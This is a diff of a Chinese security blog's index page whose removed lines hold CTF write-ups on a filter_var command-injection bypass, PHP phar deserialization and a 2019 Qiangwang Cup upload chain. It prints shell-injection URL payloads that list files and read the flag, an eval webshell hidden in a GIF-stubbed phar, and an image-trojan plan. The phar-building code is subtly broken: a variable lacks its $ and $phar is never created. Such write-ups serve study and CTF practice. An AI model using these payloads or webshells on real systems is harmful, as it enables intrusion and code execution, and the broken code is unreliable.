ErrorException(<span class="string">'Malformed URI'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
-<p>遍历 $try 中的键名，获取该键的键值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($server-&gt;has($method) <span class="keyword">and</span> $uri = $server-&gt;get($method))</span><br></pre></td></tr></table></figure></p>
-<p>进行三次过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uri = filter_var(rawurldecode($uri), FILTER_SANITIZE_URL);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// remove script path/name</span></span><br><span class="line">$uri = <span class="keyword">static</span>::remove_script_name($uri, $server);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// remove the relative uri</span></span><br><span class="line">$uri = <span class="keyword">static</span>::remove_relative_uri($uri);</span><br></pre></td></tr></table></figure></p>
-<p>其过滤方法如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">($value, $uri)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// make sure our search value is a non-empty string</span></span><br><span class="line">		<span class="keyword">if</span>(is_string($value) <span class="keyword">and</span> strlen($value)) &#123;</span><br><span class="line">			<span class="comment">// if the search value is at the start sub it out</span></span><br><span class="line">			<span class="keyword">if</span>(strpos($uri, $value) === <span class="number">0</span>) &#123;</span><br><span class="line">				$uri = substr($uri, strlen($value));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $uri;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Remove the SCRIPT_NAME from the uri path</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remove_script_name</span><span class="params">($uri, $server)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::remove($server-&gt;get(<span class="string">'SCRIPT_NAME'</span>), $uri);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Remove the relative path from the uri set in the application config</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remove_relative_uri</span><span class="params">($uri)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// remove base url</span></span><br><span class="line">		<span class="keyword">if</span>($base = Config::app(<span class="string">'url'</span>)) &#123;</span><br><span class="line">			$uri = <span class="keyword">static</span>::remove(rtrim($base, <span class="string">'/'</span>), $uri);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// remove index</span></span><br><span class="line">		<span class="keyword">if</span>($index = Config::app(<span class="string">'index'</span>)) &#123;</span><br><span class="line">			$uri = <span class="keyword">static</span>::remove(<span class="string">'/'</span> . $index, $uri);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $uri;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<p>其中并没有对xss漏洞的攻击进行过滤<br>直接构造payload如下：<br><img src="/2019/06/07/依葫芦画瓢之filter-var函数缺陷/依葫芦画瓢之filter_var函数缺陷/3.png" alt=""></p>
-<h1 id="CTF小试"><a href="#CTF小试" class="headerlink" title="CTF小试"></a>CTF小试</h1><p>环境搭建：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">\\index.php</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\flag3Ejasf.php	</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   $flag = <span class="string">"you are right"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这道题中，index.php中有两个过滤器，一个是filter_var()，一个是parse_url,获取host正则检验，<br>这里考察命令执行漏洞，关键代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br></pre></td></tr></table></figure></p>
-<p>这是外部代码执行函数，看着这样子，我们是要构造的payload是要能闭合无用的字段‘“’；还要能执行代码，这里使用”;“加入我们想要执行的代码，最后payload还要以”sec-redclub.com“结尾。<br>先绕过filter_var()函数,构造payload：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=demo://demo@sec-redclub.com</span><br></pre></td></tr></table></figure></p>
-<p>然后综上所述,构造payload：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=demo://demo@";ls;"sec-redclub.com</span><br></pre></td></tr></table></figure></p>
-<p>获取当前文件目录flag3Ejasf.php index.php</p>
-<p>然后获取flag，构造payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=demo://demo@";cat&lt;flag3Ejasf.php;"sec-redclub.com</span><br></pre></td></tr></table></figure></p>
-<p>由此解出该题</p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/07/依葫芦画瓢之filter-var函数缺陷/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1156,7 +1294,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1242,21 +1380,19 @@
       
         
           
-            <h1 id="phar介绍"><a href="#phar介绍" class="headerlink" title="phar介绍"></a>phar介绍</h1><p>参考文章：<br><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/" target="_blank" rel="noopener">PHP反序列化入门之phar</a></p>
-<p>phar就是php压缩文档，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<strong>file://</strong>,<strong> php://</strong>等类似，也是一种流包装器。</p>
-<p>phar结构由 4 部分组成</p>
-<p><strong>stub phar</strong> 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；<br><strong>manifest</strong> 压缩文件的属性等信息，以序列化存储；<br><strong>contents</strong> 压缩文件的内容；<br><strong>signature</strong> 签名，放在文件末尾；</p>
-<h2 id="划重点"><a href="#划重点" class="headerlink" title="划重点"></a>划重点</h2><p>这里有两个关键点:<br>(1) 文件标识，必须以<strong>__HALT_COMPILER();?&gt;</strong>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</p>
-<p>(2) 反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。</p>
-<h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><p>现有一段测试代码如下：<br>这个环境搭建晚之后，要将代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $ha = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;ha);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ka = $_GET[<span class="string">'file'</span>];</span><br><span class="line">file_exists($ka);</span><br></pre></td></tr></table></figure></p>
-<p>在foo()类中的$ha是可控的，并且存在__destruct()魔术方法，这里存在反序列化漏洞，那么通过函数file_exists()对文件进行操作，运用到phar的知识点。</p>
-<p>除了<strong>file_exists()</strong>以外，能触发这种漏洞的函数还有：<br><img src="/2019/06/07/php反序列化之phar/1.png" alt=""></p>
-<p>我们构造phar文件的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">//将我们需要放入的反序列化内容放在此处  </span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">foo</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">  	<span class="keyword">var</span> $ha = <span class="string">"@eval($_GET['code'])"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $o = <span class="keyword">new</span> foo();</span><br><span class="line">  filename = <span class="string">'shell.phar'</span>;<span class="comment">//后缀名必须为phar,否则代码执行不了</span></span><br><span class="line">  file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">  $phar-&gt;startBuffering();</span><br><span class="line">  $phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">  $phar-&gt;setMetadata($o);<span class="comment">//此处存放数据的方式是以序列化的方式存放</span></span><br><span class="line">  $phar-&gt;addFromString(<span class="string">"shell.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">  $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><strong>$phar-&gt;setMetadata($o);//此处存放数据的方式是以序列化的方式存放<br>生成一个shell.phar文件，然后我们通过伪协议phar://读取，数据就会被反序列化，那么我们定义的$ha就会被传入</strong></p>
-<p>我们可以修改phar文件后缀为gif.<br><img src="/2019/06/07/php反序列化之phar/2.png" alt=""></p>
-<p>然后访问该gif文件：<br><img src="/2019/06/07/php反序列化之phar/3.png" alt=""></p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/07/php反序列化之phar/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1318,7 +1454,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1414,47 +1550,19 @@
       
         
           
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2019年强网杯复现，这一次有很多感触，虽然只是复现，但也学到了很多，超有意思</p>
-<p>参考文章：<br><a href="https://mochazz.github.io/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">2019强网杯Web部分题解</a><br><a href="https://zhzhdoai.github.io/" target="_blank" rel="noopener">张师傅的博客</a></p>
-<h1 id="0x01-upload-img"><a href="#0x01-upload-img" class="headerlink" title="0x01 upload_img"></a>0x01 upload_img</h1><h2 id="分析攻击过程"><a href="#分析攻击过程" class="headerlink" title="分析攻击过程"></a>分析攻击过程</h2><p>这道题在登录后，我们通过burp抓包会发现，我们的cookie很可疑，然后解码后发现这里的cookie里面的字段有我们上传的图片<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=YTo1OntzOjI6IklEIjtpOjk7czo4OiJ1c2VybmFtZSI7czoxMDoiMTExQHFxLmNvbSI7czo1OiJlbWFpbCI7czoxMDoiMTExQHFxLmNvbSI7czo4OiJwYXNzd29yZCI7czozMjoiNjNhOWYwZWE3YmI5ODA1MDc5NmI2NDllODU0ODE4NDUiO3M6MzoiaW1nIjtzOjc5OiIuLi91cGxvYWQvM2IxNDEyNzUzZjQ3NWNjOTY5YzM3MjMxZGQ2ZWFlYTIvYTVkNWU5OTVmMWE4ODgyY2I0NTllYmEyMTAyODA1Y2QucG5nIjt9</span><br></pre></td></tr></table></figure></p>
-<p>解码后：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=a:<span class="number">5</span>:&#123;s:<span class="number">2</span>:<span class="string">"ID"</span>;i:<span class="number">9</span>;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">10</span>:<span class="string">"111@qq.com"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">10</span>:<span class="string">"111@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">32</span>:<span class="string">"63a9f0ea7bb98050796b649e85481845"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">79</span>:<span class="string">"../upload/3b1412753f475cc969c37231dd6eaea2/a5d5e995f1a8882cb459eba2102805cd.png"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这道题实际上是一个代码审计题，我们使用dirsearch可以扫到网站源码审计源码</p>
-<p>文件../application/web/controller/index.php<br>代码<strong>37</strong>行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>发现这段代码中的我们的请求中的cookie在这儿被解码，并且被反序列化。所以我们可以<strong>序列化任意类</strong>。</p>
-<p>文件../application/web/controller/Profile.php<br>代码<strong>27</strong>行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>这段代码中的关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br></pre></td></tr></table></figure></p>
-<p>这里的this-&gt;filename,this-&gt;filename_tmp是可以通过反序列化控制的，此外copy()函数会将filename_tmp的内容复制到filename<br>那么我们就可先上传一个木马图，然后通过反序列化将filename修改为我们需要的文件名，filename_tmp为我们的木马图文件位置，由此绕过bypass,所以这里我们的目的就是调用<strong>Profile类中的upload_img()方法</strong></p>
-<p>文件../application/web/controller/Profile.php<br>代码<strong>67</strong>行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>这段代码起到更新cookie的作用</p>
-<p>然后看向<br>文件../application/web/controller/Register.php<br>代码<strong>10</strong>行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();<span class="comment">//覆盖该类为profile类</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>代码<strong>58</strong>行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;checker-&gt;index();<span class="comment">//此时，此类为profile类，调用index()的时候，将会触发_call() 进而触发_get()方法</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
-<p>这里$this-&gt;checker为Index类，其中<strong>$this-&gt;registed、$this-&gt;checker 在反序列化时也是可控的</strong>,然后调用Index类中的index方法</p>
-<p>回头看<br>文件../application/web/controller/Profile.php<br>代码<strong>82</strong>行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>这里的<strong>get(),以及</strong>call()分别为魔术方法</p>
-<p><strong>call():当调用一个不存在或者权限不够的方法的时候，会自动调用</strong>call()方法<br><strong>get():当访问一个不存在或者权限不够的属性的时候，会自动调用</strong>get()方法</p>
-<p>其中$name：被调用的方法名</p>
-<p>其中$arguments：被调用的方法的参数列表数组</p>
-<p>所以我们可以覆盖$this-&gt;checker为Profile类，然后访问index()方法，这时候将会触发<strong>call(),然后<strong>$this-&gt;{$name}=index</strong>,这是一个不存在的属性，触发</strong>get()方法，从而<strong>return $this-&gt;except[$name]</strong>,这里的<strong>this-&gt;except是可控的属性</strong>，通过该属性访问upload_img()方法。从而完成攻击。</p>
-<p>POP链如下：<br><img src="/2019/06/07/2019年强网杯部分web复现/1.png" alt=""></p>
-<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>上传一个一句话木马图，我的一句话木马图里的内容为’<strong>phpinfo()</strong>‘<br>被保存在<strong>../upload/3b1412753f475cc969c37231dd6eaea2/a5d5e995f1a8882cb459eba2102805cd.png</strong></p>
